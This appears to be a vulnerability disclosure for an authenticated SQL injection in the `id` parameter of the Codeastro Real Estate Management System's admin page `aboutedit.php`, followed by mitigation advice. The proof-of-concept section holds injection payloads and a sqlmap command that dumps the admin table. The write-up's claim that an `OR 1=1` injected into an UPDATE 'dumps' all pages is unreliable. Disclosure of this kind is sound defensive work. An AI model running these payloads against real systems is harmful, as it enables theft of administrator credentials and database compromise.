## Vulnerability Details:
- **Application Name**: Codeastro Real Estate Management System 
- **Software Link**: [Download Link](https://codeastro.com/real-estate-management-system-in-php-with-source-code/)
- **Vendor Homepage**: [Vendor Homepage](https://codeastro.com/)
- **BuG**: Authenticated SQL Injection 
- **BUG_Author**: egsec


## About project:
- In particular, this Real Estate Management System Project in PHP focuses mainly on publishing and viewing properties. To be more precise, the system helps to keep a number of sales and rental properties.

## Vulnerability Description:
- An SQL injection vulnerability exists in the `id` parameter of the `aboutedit.php` page within the admin panel of the application. This vulnerability allows an attacker to manipulate the SQL query executed by the server by injecting malicious SQL code through the id parameter.

## Vulnerable Code Section:
- `aboutedit.php`:
```php
...
$aid = $_GET['id'];
..
$sql = "UPDATE about SET title = '{$title}' , content = '{$content}', image ='{$aimage}' WHERE id = {$aid}";
...
```
- In the code above, the `id` parameter from the `$_GET` superglobal is directly included in the SQL query without any sanitization or parameterization. This allows an attacker to inject malicious SQL code into the id parameter, potentially manipulating the query and compromising the database.

## Proof of Concept (PoC):
- put the single quote to the `id` parameter => `http://localhost/RealEstate-PHP/admin/aboutedit.php?id=10'`:

![image](https://github.com/user-attachments/assets/732ce7b0-7635-4265-bffb-682d87bd65c1)

it means that single quote `'` is executed as command by application
- use this payload (`aboutedit.php?id=11 OR 1=1`) and notice that it will dump all "About Pages":

![image](https://github.com/user-attachments/assets/1f7d14de-1e54-45dd-8ebe-ca9a3ab57e9d)

execution in the code:
```sql
UPDATE about SET title = '...', content = '...', image = '...' WHERE id = 10 OR 1=1;
```
- after detecting sql injection vulnerability, the exploitation step can be implemented by the `sqlmap`:
```python
python3.12 sqlmap.py -u "http://localhost/RealEstate-PHP/admin/aboutedit.php?id=10*" --dbms MySQL -D realestatephp -T admin --dump
```
it will dump admin data in the database:

![image](https://github.com/user-attachments/assets/8ae499df-dfed-4368-9f6d-d167dfc6cb47)

- PoC video: [link](https://www.youtube.com/watch?v=wVoNiFzQqJ0)

## Impact:
- This SQL injection vulnerability allows attackers to manipulate database queries through the id parameter. Exploiting this flaw can lead to unauthorized data modification, data leakage, privilege escalation, and, in severe cases, complete database compromise. This could result in data loss, exposure of sensitive information, and compliance violations, ultimately damaging the organization’s reputation and leading to potential legal repercussions. Immediate remediation is crucial to protect the integrity and security of the application and its data.

## Mitigation:
- Prepared Statements: The query now uses prepare() and bind_param() methods, which ensure that input values are safely bound to the query without risking SQL injection.
- Data Type Binding: bind_param() specifies the data types of the parameters (e.g., "sssi" for string, string, string, integer), adding an extra layer of security by validating input types.
- Validation and Escaping: Prepared statements handle escaping of special characters automatically, reducing the risk of injection.
